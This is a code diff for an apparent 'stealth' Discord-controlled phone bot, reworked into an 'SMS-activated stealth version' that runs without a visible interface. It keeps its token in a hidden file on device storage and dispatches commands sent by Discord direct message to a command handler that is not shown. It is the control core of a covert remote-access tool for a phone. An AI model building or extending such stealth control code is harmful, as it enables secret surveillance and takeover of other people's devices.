@@ -1,78 +1,70 @@
-"""Discord Phone Bot — stealth version.
-Connects to Discord automatically. No visible GUI.
 """
-
+Discord Phone Bot class — SMS-activated stealth version.
+"""
 import asyncio
 import discord
 import sys
-import os
 from pathlib import Path
 
-# ─── Configuration ──────────────────────────────────────────────
-# Change this to your bot token, or the app reads it from:
-# /sdcard/Download/.token.txt (one line, no newline)
-HARDCODED_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
-CONFIG_PATH = "/sdcard/Download/.token.txt"
+TOKEN_PATH = "/sdcard/Download/.phonebot_token"
+ACTIVATED = False
+bot_client = None
 
-# ─── Discord Client Setup ───────────────────────────────────────
 intents = discord.Intents.default()
 intents.message_content = True
+
 
 class PhoneBot(discord.Client):
     async def on_ready(self):
         print(f"[+] Bot connected as {self.user}")
-        print(f"[+] Start DMing {self.user} with commands")
 
     async def on_message(self, message):
-        # Ignore own messages
         if message.author == self.user:
             return
-
-        # Ignore messages that aren't DMs
         if not isinstance(message.channel, discord.channel.DMChannel):
             return
-
-        # Only respond to messages starting with !
         if not message.content.startswith("!"):
             return
 
         try:
             from commands import handle_command
-            result = await handle_command(message.content, message)
+            # Split !command args
+            parts = message.content.strip().split()
+            cmd = parts[0][1:].lower()  # Remove !
+            args = " ".join(parts[1:])
+            result = await handle_command(cmd, args, message)
             if result:
                 await message.channel.send(result)
         except Exception as e:
             await message.channel.send(f"Error: {str(e)}")
 
-def get_token():
-    """Try config file first, then fallback to hardcoded."""
+
+def load_token():
+    """Read saved token from device."""
     try:
-        token_path = Path(CONFIG_PATH)
-        if token_path.exists():
-            token = token_path.read_text().strip()
-            if token:
-                return token
-    except Exception:
+        p = Path(TOKEN_PATH)
+        if p.exists():
+            return p.read_text().strip()
+    except:
         pass
-
-    if HARDCODED_TOKEN and HARDCODED_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
-        return HARDCODED_TOKEN
-
     return None
 
-async def main():
-    token = get_token()
-    if not token:
-        print("[-] No token found. Create /sdcard/Download/.token.txt with your bot token.")
-        # Wait a bit then try again (in case the file is being pushed)
-        await asyncio.sleep(30)
-        token = get_token()
-        if not token:
-            print("[-] Still no token. Exiting.")
-            sys.exit(1)
 
-    bot = PhoneBot(intents=intents)
-    await bot.start(token)
+def save_token(token):
+    """Persist token to device storage."""
+    try:
+        Path(TOKEN_PATH).write_text(token.strip())
+        return True
+    except:
+        return False
 
-if __name__ == "__main__":
-    asyncio.run(main())
+
+async def start_bot(token):
+    """Start the Discord client."""
+    global bot_client, ACTIVATED
+    if bot_client is not None:
+        return
+
+    ACTIVATED = True
+    bot_client = PhoneBot(intents=intents)
+    await bot_client.start(token)
